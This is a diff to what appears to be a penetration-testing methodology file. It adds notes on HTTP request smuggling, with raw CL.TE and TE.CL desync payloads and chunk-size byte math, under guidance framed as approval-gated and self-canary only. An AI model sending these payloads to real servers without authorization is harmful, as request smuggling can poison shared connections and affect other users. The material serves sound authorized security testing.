@@ -36,3 +36,43 @@ response). This proves desync without touching any other user. Burp Repeater "se
 ## Safety
 Approval-gated. Timing + self-canary only. Confirm no persistent connection/queue poisoning remains;
 if the target queues requests, STOP and report rather than risk other users.
+
+---
+## 0daysec enrichment (adapted from the user's HTTP-request-smuggling notes)
+
+### CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding
+The front-end forwards the whole body (per CL); the back-end stops at the `0\r\n\r\n` chunk terminator,
+leaving your prefix queued for the NEXT request on that connection.
+```
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+(`G` prepends to the next request → `GPOST …` = a tell-tale 404/405 on YOUR follow-up = desync.)
+
+### TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length
+Here the chunk-size line is **hex** and must equal the byte length of the smuggled block.
+```
+POST / HTTP/1.1
+Host: TARGET
+Content-Length: 4
+Transfer-Encoding: chunked
+
+78
+GET /404-canary HTTP/1.1
+Host: TARGET
+...pad so the block is exactly 0x78 = 120 bytes...
+
+0
+
+```
+`78` (hex) = 120 (decimal): count every byte of your smuggled request block and set the chunk-size line
+to its hex length, or the back-end mis-frames. Terminate with `0\r\n\r\n`.
+
+**Byte-math reminder:** chunk size is hex; `\r\n` are 2 bytes each; off-by-one here is the #1 cause of a
+"non-repro" desync. Keep the smuggled request a self-canary (hits a 404 path on your own next request).
